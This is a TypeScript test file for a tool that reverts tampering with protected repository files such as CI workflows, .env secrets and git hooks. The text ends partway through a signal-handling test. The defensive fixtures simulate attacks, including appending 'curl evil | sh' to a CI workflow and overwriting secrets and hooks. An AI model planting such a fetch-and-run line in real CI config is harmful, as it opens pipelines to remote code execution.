import test from "node:test";
import assert from "node:assert/strict";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { spawn, spawnSync, type ChildProcess } from "node:child_process";
import { getRepoRoot, gitChildEnv } from "../lib/git/git.js";
import { recoverCageJournal, resolveCageJournalDir } from "#cage/cage-journal.js";
import { listDescendantPids } from "#cage/cage-process.js";
import { runCage } from "#cage/cage-run.js";
import { buildCagePlan, cageBasenameRule, classifyCagePath } from "#cage/cage-rules.js";
import { cageGlobToRegExp } from "#cage/cage-config.js";
import { CAGE_MAX_SCAN_BYTES, CAGE_MAX_TARGETS } from "#cage/cage-snapshot.js";
import { CAGE_LIMITS, CAGE_LIMITS_SUMMARY, CAGE_UPGRADE_FOOTER, formatCageReport } from "#cage/cage-report.js";
import { writeManifest } from "./test-fixtures.js";

const SECRET = "TOKEN=SECRET-MARKER-7f3a";

/** Caged command: a silent `node -e` script run with the fixture as cwd. */
function nodeScript(body: string): string[] {
  return [process.execPath, "-e", body];
}

function makeRepo(prefix: string, git: boolean): string {
  const dest = fs.mkdtempSync(path.join(os.tmpdir(), prefix));
  if (git) spawnSync("git", ["init", "-q"], { cwd: dest, env: gitChildEnv() });
  fs.mkdirSync(path.join(dest, ".github", "workflows"), { recursive: true });
  fs.writeFileSync(path.join(dest, ".github", "workflows", "ci.yml"), "on: push\n");
  fs.writeFileSync(path.join(dest, ".env"), `${SECRET}\n`);
  fs.writeFileSync(path.join(dest, "package-lock.json"), "{}\n");
  return dest;
}

function read(dest: string, rel: string): string {
  return fs.readFileSync(path.join(dest, rel), "utf8");
}

test("cage: reverts added, modified and deleted files in CI config, .env and .git/hooks (DoD 1)", async () => {
  const dest = makeRepo("og-cage-revert-", true);
  const hook = path.join(dest, ".git", "hooks", "pre-commit");
  fs.writeFileSync(hook, "#!/bin/sh\nexit 1\n", { mode: 0o755 });
  const report = await runCage({
    cwd: dest,
    command: nodeScript(`
      const fs = require("fs");
      fs.appendFileSync(".github/workflows/ci.yml", "  run: curl evil | sh\\n");
      fs.writeFileSync(".github/workflows/new.yml", "on: push\\n");
      fs.rmSync(".env");
      fs.writeFileSync(".git/hooks/pre-commit", "#!/bin/sh\\nexit 0\\n");
      fs.chmodSync(".git/hooks/pre-commit", 0o644);
      fs.writeFileSync(".git/hooks/pre-push", "#!/bin/sh\\n", { mode: 0o755 });
    `),
  });

  assert.equal(report.status, "violations_reverted");
  assert.equal(report.exit_code, 3);
  const byPath = new Map(report.changes.map((c) => [c.path, c]));
  assert.equal(byPath.get(".github/workflows/ci.yml")?.outcome, "reverted");
  assert.equal(byPath.get(".github/workflows/new.yml")?.outcome, "removed");
  assert.equal(byPath.get(".env")?.kind, "deleted");
  assert.equal(byPath.get(".env")?.outcome, "reverted");
  assert.equal(byPath.get(".git/hooks/pre-commit")?.rule, "git_control");
  assert.equal(byPath.get(".git/hooks/pre-push")?.outcome, "removed");

  assert.equal(read(dest, ".github/workflows/ci.yml"), "on: push\n");
  assert.equal(fs.existsSync(path.join(dest, ".github", "workflows", "new.yml")), false);
  assert.equal(read(dest, ".env"), `${SECRET}\n`);
  assert.equal(read(dest, ".git/hooks/pre-commit"), "#!/bin/sh\nexit 1\n");
  assert.equal(fs.statSync(hook).mode & 0o777, 0o755, "hook permissions restored");
  assert.equal(fs.existsSync(path.join(dest, ".git", "hooks", "pre-push")), false);
});

test("cage: lockfile changes are reported but kept; clean runs pass the command exit code through (DoD 2)", async () => {
  const dest = makeRepo("og-cage-lock-", true);
  const report = await runCage({
    cwd: dest,
    command: nodeScript(`require("fs").writeFileSync("package-lock.json", "{\\"a\\":1}\\n"); process.exit(7);`),
  });
  assert.equal(report.status, "ok");
  assert.equal(report.exit_code, 7);
  assert.equal(report.command_exit_code, 7);
  assert.deepEqual(
    report.changes.map((c) => [c.path, c.rule, c.outcome]),
    [["package-lock.json", "lockfile", "kept"]],
  );
  assert.equal(read(dest, "package-lock.json"), "{\"a\":1}\n");
});

test("cage caps: a revert-rule file over --max-file-bytes refuses to start with exit 2; nothing is left detect-only (MSN-0254 DoD 1)", async () => {
  const dest = makeRepo("og-cage-cap-", false);
  fs.writeFileSync(path.join(dest, ".env.production"), "X".repeat(4096));
  const probe = nodeScript(`require("fs").writeFileSync("probe-ran.txt", "ran");`);
  await assert.rejects(runCage({ cwd: dest, maxFileBytes: 1024, command: probe }), (err: Error & { exitCode?: number; code?: string }) => {
    assert.equal(err.code, "GXT_CAGE_FILE_TOO_LARGE");
    assert.match(err.message, /1 protected file\(s\) exceed the 1024-byte per-file snapshot cap .*\.env\.production \(4096 bytes\).*the command was not run/);
    return err.exitCode === 2;
  });
  assert.equal(fs.existsSync(path.join(dest, "probe-ran.txt")), false, "the command never ran");
  assert.equal(read(dest, ".env.production"), "X".repeat(4096), "the file is untouched");

  const cli = path.join(getRepoRoot(), "dist", "cli", "index.js");
  const r = spawnSync(process.execPath, [cli, "cage", "--max-file-bytes", "1024", "--", ...probe], { cwd: dest, encoding: "utf8", env: gitChildEnv() });
  assert.equal(r.status, 2, r.stderr);
  assert.match(r.stderr, /GXT_CAGE_FILE_TOO_LARGE.*\.env\.production \(4096 bytes\)/);
  assert.equal(fs.existsSync(path.join(dest, "probe-ran.txt")), false);

  // --report-only keeps no bytes, so the cap does not apply: the change is reported, not restored.
  const reported = await runCage({
    cwd: dest,
    maxFileBytes: 1024,
    reportOnly: true,
    command: nodeScript(`require("fs").writeFileSync(".env.production", "Y".repeat(4096));`),
  });
  assert.deepEqual(reported.changes.map((c) => [c.path, c.outcome]), [[".env.production", "reported"]]);
  assert.equal(reported.exit_code, 3);

  // --allow-override downgrades the oversized path to report (announced), so the run starts.
  const overridden = await runCage({
    cwd: dest,
    maxFileBytes: 1024,
    watch: false,
    allowOverride: [".env.production"],
    command: nodeScript(`require("fs").writeFileSync(".env.production", "Z".repeat(4096));`),
  });
  assert.deepEqual(overridden.changes.map((c) => [c.path, c.outcome, c.overridden]), [[".env.production", "kept", true]]);
  assert.ok(!formatCageReport(overridden).some((l) => l.includes("detect_only")), "detect_only is never reported");
});

test("cage caps: revert-rule files over the total snapshot budget refuse to start with exit 2 (MSN-0254 DoD 2)", async () => {
  const dest = makeRepo("og-cage-budget-", false);
  const probe = nodeScript(`require("fs").writeFileSync("probe-ran.txt", "ran");`);
  // Budget fits nothing beyond the first few bytes; .env alone (well under the per-file cap) exceeds it.
  await assert.rejects(runCage({ cwd: dest, maxTotalBytes: 4, command: probe }), (err: Error & { exitCode?: number; code?: string }) => {
    assert.equal(err.code, "GXT_CAGE_SNAPSHOT_BUDGET_EXCEEDED");
    assert.match(err.message, /protected files total \d+ bytes, over the 4-byte in-memory snapshot budget; the command was not run/);
    return err.exitCode === 2;
  });
  assert.equal(fs.existsSync(path.join(dest, "probe-ran.txt")), false, "the command never ran");
  assert.equal(read(dest, ".env"), `${SECRET}\n`);
  const ok = await runCage({ cwd: dest, watch: false, command: probe });
  assert.equal(ok.status, "ok", "the default budget leaves a normal repo alone");
});

test("cage: --report-only detects and fails without reverting", async () => {
  const dest = makeRepo("og-cage-report-only-", false);
  const report = await runCage({
    cwd: dest,
    reportOnly: true,
    command: nodeScript(`require("fs").writeFileSync(".env", "TOKEN=changed\\n");`),
  });
  assert.equal(report.status, "violations_unresolved");
  assert.equal(report.revert_mode, "report_only");
  assert.equal(report.changes[0]?.outcome, "reported");
  assert.equal(read(dest, ".env"), "TOKEN=changed\n");
});

test("cage: .env.example is not protected; .env.* and nested lockfiles are", () => {
  assert.equal(cageBasenameRule(".env.example"), null);
  assert.equal(cageBasenameRule(".env.local"), "secrets");
  assert.equal(cageBasenameRule(".env"), "secrets");
  assert.equal(cageBasenameRule("Cargo.lock"), "lockfile");
  assert.equal(cageBasenameRule("environment.ts"), null);
});

test("cage: unions manifest forbidden_zones into the protected set (DoD 5)", async () => {
  const dest = makeRepo("og-cage-manifest-", true);
  writeManifest(dest, {
    app: { trust_threshold: "Tier-2", tmvc_roots: ["src/"], forbidden_zones: ["infra/"] },
  });
  fs.mkdirSync(path.join(dest, "infra"), { recursive: true });
  fs.writeFileSync(path.join(dest, "infra", "main.tf"), "resource {}\n");
  const report = await runCage({
    cwd: dest,
    command: nodeScript(`require("fs").writeFileSync("infra/main.tf", "");`),
  });
  assert.equal(report.manifest_zones, 1);
  assert.deepEqual(
    report.changes.map((c) => [c.path, c.rule, c.outcome]),
    [["infra/main.tf", "manifest_forbidden_zone", "reverted"]],
  );
  assert.equal(read(dest, "infra/main.tf"), "resource {}\n");
});

test("cage: an invalid manifest fails closed before the command runs", async () => {
  const dest = makeRepo("og-cage-bad-manifest-", true);
  fs.mkdirSync(path.join(dest, ".gitagent", "foreman"), { recursive: true });
  fs.writeFileSync(path.join(dest, ".gitagent", "foreman", "MANIFEST.json"), "{}");
  await assert.rejects(
    runCage({ cwd: dest, command: nodeScript(`require("fs").writeFileSync("ran.txt", "1");`) }),
    /MANIFEST/,
  );
  assert.equal(fs.existsSync(path.join(dest, "ran.txt")), false);
});

test("cage CLI: zero-config in a non-git dir; --json report carries digests only, no file bodies (DoD 4, DoD 5)", () => {
  const cli = path.join(getRepoRoot(), "dist", "cli", "index.js");
  const dest = makeRepo("og-cage-cli-", false);
  const r = spawnSync(
    process.execPath,
    [cli, "cage", "--json", "--", ...nodeScript(`require("fs").writeFileSync(".env", "TOKEN=SECRET-MARKER-new\\n");`)],
    { cwd: dest, encoding: "utf8", env: gitChildEnv() },
  );
  assert.equal(r.status, 3, r.stderr);
  assert.ok(!r.stdout.includes("SECRET-MARKER"), "no file bodies in the JSON report");
  assert.ok(!r.stderr.includes("SECRET-MARKER"), "no file bodies on stderr");
  const report = JSON.parse(r.stdout) as { report_schema: string; root: string; changes: Record<string, unknown>[] };
  assert.equal(report.report_schema, "gantry.cage-report.v1");
  assert.equal(fs.realpathSync(report.root), fs.realpathSync(dest));
  assert.deepEqual(Object.keys(report.changes[0]!).sort(), [
    "error_code",
    "kind",
    "outcome",
    "overridden",
    "path",
    "rule",
    "sha256_after",
    "sha256_before",
    "source",
  ]);
  assert.match(String(report.changes[0]!.sha256_before), /^[0-9a-f]{64}$/);
  assert.equal(read(dest, ".env"), `${SECRET}\n`);
});

test("cage CLI: missing command fails", () => {
  const cli = path.join(getRepoRoot(), "dist", "cli", "index.js");
  const r = spawnSync(process.execPath, [cli, "cage", "--"], { encoding: "utf8" });
  assert.notEqual(r.status, 0);
});

test("gantry-cage bin, and the opengantry-cage alias, run the same cage and revert (MSN-0258 DoD 1-3)", () => {
  const ogRoot = getRepoRoot();
  const pkg = JSON.parse(fs.readFileSync(path.join(ogRoot, "package.json"), "utf8")) as { bin: Record<string, string> };
  assert.equal(pkg.bin["gantry-cage"], "dist/cli/cage-bin.js");
  assert.equal(pkg.bin["opengantry-cage"], pkg.bin["gantry-cage"], "opengantry-cage stays a silent alias of the same file");
  const bin = path.join(ogRoot, pkg.bin["gantry-cage"]!);
  const help = spawnSync(process.execPath, [bin, "--help"], { encoding: "utf8" });
  assert.match(help.stdout, /^Usage: gantry-cage \[options\] <command\.\.\.>/m, "help names gantry-cage, whichever name was typed");
  assert.ok(!help.stdout.includes("opengantry-cage"), "the alias is silent");
  const dest = makeRepo("og-cage-bin-", true);
  const r = spawnSync(
    process.execPath,
    [bin, "--", ...nodeScript(`require("fs").appendFileSync(".github/workflows/ci.yml", "evil\\n");`)],
    { cwd: dest, encoding: "utf8", env: gitChildEnv() },
  );
  assert.equal(r.status, 3, r.stderr);
  assert.match(r.stderr, /cage: violations_reverted/);
  assert.equal(read(dest, ".github/workflows/ci.yml"), "on: push\n");
});

test("cage report: violations end with the upgrade footer; ok runs and --json carry none (MSN-0235 DoD 1)", async () => {
  const bad = await runCage({
    cwd: makeRepo("og-cage-footer-bad-", false),
    command: nodeScript(`require("fs").writeFileSync(".env", "TOKEN=changed\\n");`),
  });
  const badLines = formatCageReport(bad);
  assert.equal(bad.exit_code, 3);
  assert.equal(badLines.at(-1), `cage: ${CAGE_UPGRADE_FOOTER}`);
  assert.match(CAGE_UPGRADE_FOOTER, /npx -p @jeger-ai\/opengantry gantry init/);
  assert.ok(!JSON.stringify(bad).includes(CAGE_UPGRADE_FOOTER), "footer is human output only");

  const ok = await runCage({ cwd: makeRepo("og-cage-footer-ok-", false), command: nodeScript("") });
  assert.equal(ok.status, "ok");
  assert.ok(!formatCageReport(ok).some((l) => l.includes(CAGE_UPGRADE_FOOTER)));
});

test("cage report: stderr limits are one compact line; --json keeps the full list (MSN-0235 DoD 2)", async () => {
  // --no-watch: the after-exit limits this test was written for; watch-mode limits are covered in cage-watch.test.ts.
  const report = await runCage({ cwd: makeRepo("og-cage-limits-", false), command: nodeScript(""), watch: false });
  const limitLines = formatCageReport(report).filter((l) => l.includes("limits:"));
  assert.deepEqual(limitLines, [`cage: exit 0; limits: ${CAGE_LIMITS_SUMMARY}`]);
  assert.ok(limitLines[0]!.length < 120, `limits line is ${String(limitLines[0]!.length)} chars`);
  assert.deepEqual(report.limits, CAGE_LIMITS);
  assert.equal(report.limits.length, 5);
});

// ---- MSN-0239: additive .cage.yaml and --allow-override ----

function writeFile(dest: string, rel: string, body: string): void {
  fs.mkdirSync(path.dirname(path.join(dest, rel)), { recursive: true });
  fs.writeFileSync(path.join(dest, rel), body);
}

function runCli(dest: string, args: string[]): ReturnType<typeof spawnSync> & { stdout: string; stderr: string } {
  const cli = path.join(getRepoRoot(), "dist", "cli", "index.js");
  return spawnSync(process.execPath, [cli, "cage", ...args], { cwd: dest, encoding: "utf8", env: gitChildEnv() }) as never;
}

const CAGE_YAML = [
  "protect:",
  "  - path: infra/",
  "  - glob: \"**/*.pem\"",
  "  - path: docs/generated.md",
  "    mode: report",
  "",
].join("\n");

test("cage .cage.yaml: protect paths and globs are added to the built-in set; report entries are kept (MSN-0239 DoD 1)", async () => {
  const dest = makeRepo("og-cage-yaml-", true);
  writeFile(dest, ".cage.yaml", CAGE_YAML);
  writeFile(dest, "infra/main.tf", "resource {}\n");
  writeFile(dest, "deep/a/b/server.pem", "KEY\n");
  writeFile(dest, "docs/generated.md", "v1\n");
  writeFile(dest, "src/app.ts", "x\n");
  const report = await runCage({
    cwd: dest,
    watch: false,
    command: nodeScript(`
      const fs = require("fs");
      fs.writeFileSync("infra/main.tf", "resource { evil }\\n");
      fs.writeFileSync("infra/new.tf", "x\\n");
      fs.writeFileSync("deep/a/b/server.pem", "EVIL\\n");
      fs.writeFileSync("top.pem", "NEW\\n");
      fs.writeFileSync("docs/generated.md", "v2\\n");
      fs.writeFileSync("src/app.ts", "y\\n");
    `),
  });
  assert.deepEqual(report.cage_config, { present: true, entries: 3, committed: false });
  assert.equal(report.status, "violations_reverted");
  assert.deepEqual(
    report.changes.map((c) => [c.path, c.rule, c.source, c.outcome]),
    [
      ["deep/a/b/server.pem", "cage_protect", "cage_yaml", "reverted"],
      ["docs/generated.md", "cage_protect", "cage_yaml", "kept"],
      ["infra/main.tf", "cage_protect", "cage_yaml", "reverted"],
      ["infra/new.tf", "cage_protect", "cage_yaml", "removed"],
      ["top.pem", "cage_protect", "cage_yaml", "removed"],
    ],
  );
  assert.equal(read(dest, "infra/main.tf"), "resource {}\n");
  assert.equal(read(dest, "deep/a/b/server.pem"), "KEY\n");
  assert.equal(read(dest, "docs/generated.md"), "v2\n");
  assert.equal(read(dest, "src/app.ts"), "y\n", "paths outside the protected set are not touched");

  const zeroConfig = await runCage({ cwd: makeRepo("og-cage-noyaml-", true), watch: false, command: nodeScript("") });
  assert.deepEqual(zeroConfig.cage_config, { present: false, entries: 0, committed: null });
  assert.deepEqual(zeroConfig.overrides, []);
});

test("cage .cage.yaml: globs keep * inside one segment and ** across segments (MSN-0239 DoD 1)", () => {
  const pem = cageGlobToRegExp("**/*.pem");
  assert.ok(pem.test("a.pem") && pem.test("x/y/a.pem"));
  assert.ok(!pem.test("a.pem.bak"));
  const one = cageGlobToRegExp("k8s/*.yaml");
  assert.ok(one.test("k8s/prod.yaml"));
  assert.ok(!one.test("k8s/prod/app.yaml"));
  assert.ok(cageGlobToRegExp("db/migrations/**").test("db/migrations/2026/001.sql"));
  assert.ok(!cageGlobToRegExp("a.b").test("axb"), "regex metacharacters are literal");
});

test("cage .cage.yaml: a top-level mode: default applies only to protect entries without their own; built-ins stay revert (MSN-0244 DoD 1)", async () => {
  const dest = makeRepo("og-cage-yaml-mode-", true);
  writeFile(dest, ".cage.yaml", ["mode: report", "contest_limit: 2", "protect:", "  - path: docs/generated.md", "  - path: infra", "    mode: revert", ""].join("\n"));
  writeFile(dest, "docs/generated.md", "v1\n");
  writeFile(dest, "infra/main.tf", "resource {}\n");
  const report = await runCage({
    cwd: dest,
    watch: false,
    command: nodeScript(`
      const fs = require("fs");
      fs.writeFileSync("docs/generated.md", "v2\\n");
      fs.writeFileSync("infra/main.tf", "evil\\n");
      fs.writeFileSync(".env", "TOKEN=agent\\n");
      fs.writeFileSync(".github/workflows/ci.yml", "evil\\n");
    `),
  });
  assert.deepEqual(
    report.changes.map((c) => [c.path, c.rule, c.outcome]),
    [
      [".env", "secrets", "reverted"],
      [".github/workflows/ci.yml", "ci_config", "reverted"],
      ["docs/generated.md", "cage_protect", "kept"],
      ["infra/main.tf", "cage_protect", "reverted"],
    ],
  );
  assert.equal(read(dest, "docs/generated.md"), "v2\n", "top-level report default applies to the entry without a mode");
  assert.equal(read(dest, "infra/main.tf"), "resource {}\n", "a per-entry mode wins over the default");
  assert.equal(read(dest, ".env"), `${SECRET}\n`, "built-in rules ignore the default");
  assert.equal(report.watch.contest_limit, 2, "contest_limit read from .cage.yaml");
  assert.deepEqual(report.cage_config, { present: true, entries: 2, committed: false });
});

const BAD_CONFIGS: readonly [string, string, RegExp][] = [
  ["top-level bad mode", "mode: ignore\nprotect: []\n", /top level: mode must be revert or report/],
  ["top-level report default on a built-in path", "mode: report\nprotect:\n  - path: .env\n", /would weaken the built-in secrets rule/],
  ["contest_limit not an integer", "contest_limit: many\n", /contest_limit must be a non-negative integer/],
  ["contest_limit negative", "contest_limit: -1\n", /contest_limit must be a non-negative integer/],
  ["invalid YAML", "protect: [\n", /invalid YAML/],
  ["unknown top-level key", "protect: []\nextra: 1\n", /unknown key "extra"/],
  ["subtractive top-level key", "relax:\n  - .env\n", /"relax" would remove protection/],
  ["subtractive entry key", "protect:\n  - path: infra\n    exclude: infra/ok\n", /"exclude" would remove protection/],
  ["unknown entry key", "protect:\n  - path: infra\n    when: always\n", /unknown key "when"/],
  ["plain string entry", "protect:\n  - infra\n", /expected a mapping/],
  ["path and glob together", "protect:\n  - path: a\n    glob: b\n", /exactly one of path: or glob:/],
  ["absolute path", "protect:\n  - path: /etc/passwd\n", /root-relative/],
  ["parent path", "protect:\n  - path: ../outside\n", /root-relative/],
  ["bad mode", "protect:\n  - path: infra\n    mode: ignore\n", /mode must be revert or report/],
  ["report on built-in secrets", "protect:\n  - path: .env\n    mode: report\n", /would weaken the built-in secrets rule/],
  ["report on built-in CI", "protect:\n  - path: .github/workflows/ci.yml\n    mode: report\n", /built-in ci_config rule/],
  ["aliases", "a: &x [1]\nprotect: *x\n", /invalid YAML: Alias resolution is disabled/],
];

test("cage .cage.yaml: invalid, unknown or subtractive config fails closed before the command runs (MSN-0239 DoD 2)", async () => {
  for (const [name, body, pattern] of BAD_CONFIGS) {
    const dest = makeRepo("og-cage-badyaml-", true);
    writeFile(dest, ".cage.yaml", body);
    await assert.rejects(
      runCage({ cwd: dest, command: nodeScript(`require("fs").writeFileSync("ran.txt", "1");`) }),
      (err: Error & { exitCode?: number; code?: string }) =>
        pattern.test(err.message) && err.exitCode === 2 && err.code === "GXT_CAGE_CONFIG_INVALID",
      name,
    );
    assert.equal(fs.existsSync(path.join(dest, "ran.txt")), false, `${name}: command must not run`);
  }
  const dest = makeRepo("og-cage-badyaml-cli-", true);
  writeFile(dest, ".cage.yaml", "relax:\n  - .env\n");
  const r = runCli(dest, ["--", ...nodeScript(`require("fs").writeFileSync("ran.txt", "1");`)]);
  assert.equal(r.status, 2, r.stderr);
  assert.match(r.stderr, /\[GXT_CAGE_CONFIG_INVALID\].*subtractive keys are not allowed/);
  assert.equal(fs.existsSync(path.join(dest, "ran.txt")), false);
});

test("cage .cage.yaml: the config protects itself; edits are restored and a new file is removed (MSN-0239 DoD 3)", async () => {
  const dest = makeRepo("og-cage-selfprot-", true);
  writeFile(dest, ".cage.yaml", CAGE_YAML);
  const edited = await runCage({
    cwd: dest,
    watchIntervalMs: 40,
    bell: () => {},
    command: nodeScript(`
      const fs = require("fs");
      fs.writeFileSync(".cage.yaml", "protect: []\\n");
      Atomics.wait(new Int32Array(new SharedArrayBuffer(4)), 0, 0, 600);
      fs.writeFileSync("probe.txt", fs.readFileSync(".cage.yaml", "utf8"));
    `),
  });
  assert.equal(read(dest, "probe.txt"), CAGE_YAML, "restored while the command was still running");
  assert.equal(read(dest, ".cage.yaml"), CAGE_YAML);
  const row = edited.changes.find((c) => c.path === ".cage.yaml");
  assert.deepEqual([row?.rule, row?.source, row?.outcome], ["cage_config", "builtin", "reverted"]);

  const fresh = makeRepo("og-cage-selfnew-", true);
  const created = await runCage({
    cwd: fresh,
    watch: false,
    command: nodeScript(`require("fs").writeFileSync(".cage.yaml", "protect:\\n  - path: src\\n");`),
  });
  assert.equal(fs.existsSync(path.join(fresh, ".cage.yaml")), false);
  assert.deepEqual(
    created.changes.map((c) => [c.path, c.rule, c.outcome]),
    [[".cage.yaml", "cage_config", "removed"]],
  );
});

test("cage caps: a protected set over the file or byte cap aborts before the command runs (MSN-0239 DoD 4)", async () => {
  assert.equal(CAGE_MAX_TARGETS, 5000);
  assert.equal(CAGE_MAX_SCAN_BYTES, 64 * 1024 * 1024);
  const dest = makeRepo("og-cage-caps-", true);
  writeFile(dest, ".cage.yaml", "protect:\n  - glob: \"**/*.dat\"\n");
  for (let i = 0; i < 6; i += 1) writeFile(dest, `data/f${String(i)}.dat`, "x".repeat(1000));
  const ran = path.join(dest, "ran.txt");
  const command = nodeScript(`require("fs").writeFileSync("ran.txt", "1");`);
  await assert.rejects(runCage({ cwd: dest, command, maxTargets: 4 }), (err: Error & { exitCode?: number; code?: string }) => {
    assert.equal(err.code, "GXT_CAGE_LIMITS_EXCEEDED");
    assert.match(err.message, /protected set too large: \d+ file\(s\), [\d.]+ MiB \(limits 4 files/);
    assert.ok(Number(/(\d+) file\(s\)/.exec(err.message)![1]) >= 9, "counts the whole set, not the first overflow");
    return err.exitCode === 2;
  });
  await assert.rejects(runCage({ cwd: dest, command, maxScanBytes: 3000 }), /protected set too large/);
  assert.equal(fs.existsSync(ran), false);
  const ok = await runCage({ cwd: dest, command, watch: false });
  assert.equal(ok.status, "ok", "default caps leave a normal repo alone");
});

test("cage --allow-override: downgrades a revert rule to report, announced at start and exit and in JSON (MSN-0239 DoD 5)", () => {
  const dest = makeRepo("og-cage-override-", true);
  const r = runCli(dest, [
    "--json",
    "--allow-override",
    ".env",
    "--",
    ...nodeScript(`require("fs").writeFileSync(".env", "TOKEN=kept\\n");`),
  ]);
  assert.equal(r.status, 0, r.stderr);
  const banner = "cage: OVERRIDE (--allow-override): changes are reported, not restored, under: .env";
  assert.equal(r.stderr.split("\n").filter((l) => l === banner).length, 1, "start banner with --json");
  const report = JSON.parse(r.stdout) as { overrides: string[]; status: string; changes: Record<string, unknown>[] };
  assert.deepEqual(report.overrides, [".env"]);
  assert.equal(report.status, "ok");
  assert.deepEqual(
    report.changes.map((c) => [c.path, c.rule, c.overridden, c.outcome]),
    [[".env", "secrets", true, "kept"]],
  );
  assert.equal(read(dest, ".env"), "TOKEN=kept\n");

  const human = runCli(makeRepo("og-cage-override-h-", true), ["--allow-override", ".env", "--", ...nodeScript("")]);
  assert.equal(human.stderr.split("\n").filter((l) => l === banner).length, 2, "banner at start and in the exit summary");
});

test("cage --allow-override: refused for git control, .cage.yaml and unprotected paths (MSN-0239 DoD 5)", () => {
  const cases: readonly [string, RegExp][] = [
    [".git/config", /git_control rules cannot be overridden/],
    [".git", /git_control rules cannot be overridden/],
    [".cage.yaml", /cage_config rules cannot be overridden/],
    ["src/app.ts", /matches no protected revert target/],
    ["package-lock.json", /matches no protected revert target/],
    ["../elsewhere", /root-relative/],
  ];
  for (const [p, pattern] of cases) {
    const dest = makeRepo("og-cage-override-bad-", true);
    const r = runCli(dest, ["--allow-override", p, "--", ...nodeScript(`require("fs").writeFileSync("ran.txt", "1");`)]);
    assert.equal(r.status, 2, `${p}: ${r.stderr}`);
    assert.match(r.stderr, pattern, p);
    assert.match(r.stderr, /\[GXT_CAGE_OVERRIDE_INVALID\]/, p);
    assert.equal(fs.existsSync(path.join(dest, "ran.txt")), false, `${p}: command must not run`);
  }
  const dest = makeRepo("og-cage-override-dir-", true);
  assert.deepEqual(buildCagePlan(dest, { overrides: [".github/"] }).overrides, [".github"], "parent dir of a target is accepted");
});

test("cage sources: plan targets and report rows say builtin, manifest or cage_yaml (MSN-0239 DoD 6)", async () => {
  const dest = makeRepo("og-cage-sources-", true);
  writeManifest(dest, { app: { trust_threshold: "Tier-2", tmvc_roots: ["src/"], forbidden_zones: ["infra/"] } });
  writeFile(dest, "infra/main.tf", "x\n");
  writeFile(dest, ".cage.yaml", "protect:\n  - path: terraform\n  - glob: \"*.pem\"\n");
  writeFile(dest, "terraform/main.tf", "x\n");
  const plan = buildCagePlan(dest);
  for (const t of plan.targets) assert.ok(["builtin", "manifest", "cage_yaml"].includes(t.source), t.abs);
  assert.ok(plan.targets.some((t) => t.source === "manifest" && t.rule === "manifest_forbidden_zone"));
  assert.ok(plan.targets.some((t) => t.source === "cage_yaml" && t.rule === "cage_protect"));
  assert.deepEqual(plan.globs.map((g) => [g.pattern, g.source]), [["*.pem", "cage_yaml"]]);

  const report = await runCage({
    cwd: dest,
    watch: false,
    command: nodeScript(`
      const fs = require("fs");
      for (const f of [".env", "infra/main.tf", "terraform/main.tf"]) fs.writeFileSync(f, "changed\\n");
    `),
  });
  assert.deepEqual(
    report.changes.map((c) => [c.path, c.source]),
    [[".env", "builtin"], ["infra/main.tf", "manifest"], ["terraform/main.tf", "cage_yaml"]],
  );
  assert.equal(classifyCagePath(plan, "x/y.pem"), null, "single * does not cross directories");
});

// ---- MSN-0253: signal trap and journal recovery -------------------------------------------------------

const POSIX_ONLY = { skip: process.platform === "win32" ? "sh/ps based" : false };
/** A nested tree that tampers .env then idles: `sh` with a background and a foreground `sleep`. */
const TAMPER_THEN_IDLE = ["sh", "-c", "printf 'TOKEN=tampered\\n' > .env; sleep 60 & sleep 60"];

function pidAlive(pid: number): boolean {
  try {
    process.kill(pid, 0);
    return true;
  } catch {
    return false;
  }
}

async function waitFor(check: () => boolean, what: string, timeoutMs = 8000): Promise<void> {
  const until = Date.now() + timeoutMs;
  while (!check()) {
    if (Date.now() > until) throw new Error(`timed out waiting for ${what}`);
    await new Promise((r) => setTimeout(r, 25));
  }
}

interface CageWrapper {
  proc: ChildProcess;
  exit: Promise<{ code: number | null; signal: NodeJS.Signals | null }>;
  stderr: () => string;
}

/** Spawn the real CLI as the cage wrapper (pipes, so SIGINT is non-interactive) and keep its stderr. */
function spawnCageWrapper(dest: string, command: readonly string[]): CageWrapper {
  const cli = path.join(getRepoRoot(), "dist", "cli", "index.js");
  const proc = spawn(process.execPath, [cli, "cage", "--no-watch", "--watch-interval-ms", "50", "--", ...command], {
    cwd: dest,
    env: gitChildEnv(),
    stdio: ["ignore", "pipe", "pipe"],
  });
  let err = "";
  proc.stderr?.on("data", (d: Buffer) => (err += d.toString()));
  const exit = new Promise<{ code: number | null; signal: NodeJS.Signals | null }>((resolve) => {
    proc.on("exit", (code, signal) => resolve({ code, signal }));
  });
  return { proc, exit, stderr: () => err };
}

function journaledPids(journalDir: string): number[] {
  try {
    return (JSON.parse(fs.readFileSync(path.join(journalDir, "pids.json"), "utf8")) as { pids: { pid: number }[] }).pids.map((p) => p.pid);
  } catch {
    return [];
  }
}

/** Start the wrapper on the tamper-then-idle tree and wait until the tamper landed and the tree is journaled. */
async function startTamperedSession(dest: string): Promise<{ wrapper: CageWrapper; tree: number[]; journalDir: string }> {
  const journalDir = resolveCageJournalDir(dest);
  const wrapper = spawnCageWrapper(dest, TAMPER_THEN_IDLE);
  await waitFor(() => read(dest, ".env") === "TOKEN=tampered\n" && journaledPids(journalDir).length >= 3, "tamper + journaled tree");
  const tree = listDescendantPids(wrapper.proc.pid!);
  assert.ok(tree.length >= 3, `sh and two sleeps enumerated, got ${String(tree.length)}`);
  return { wrapper, tree, journalDir };
}

test("cage journal: a clean run writes the baseline journal under the git dir and removes it at exit (MSN-0253 DoD 1)", async () => {
  const dest = makeRepo("og-cage-journal-clean-", true);
  const journalDir = resolveCageJournalDir(dest);
  assert.equal(fs.realpathSync(path.dirname(journalDir)), fs.realpathSync(path.join(dest, ".git")), "journal lives under the git dir");
  const report = await runCage({
    cwd: dest,
    watch: false,
    command: nodeScript(`require("fs").writeFileSync("probe-journal.txt", String(require("fs").existsSync(${JSON.stringify(path.join(journalDir, "journal.json"))})));`),
  });
  assert.equal(read(dest, "probe-journal.txt"), "true", "journal.json exists while the command runs");
  assert.equal(report.status, "ok");
  assert.equal(report.recovery, null);
  assert.equal(report.trapped_signal, null);
  assert.ok(!fs.existsSync(journalDir), "journal removed on clean shutdown");
});

test("cage signals: SIGTERM on the wrapper kills the nested sh/sleep tree and restores .env (MSN-0253 DoD 1, DoD 3)", POSIX_ONLY, async () => {
  const dest = makeRepo("og-cage-sigterm-", true);
  const { wrapper, tree, journalDir } = await startTamperedSession(dest);
  process.kill(wrapper.proc.pid!, "SIGTERM");
  const r = await wrapper.exit;
  assert.equal(r.signal, null, "the wrapper traps SIGTERM instead of dying from it");
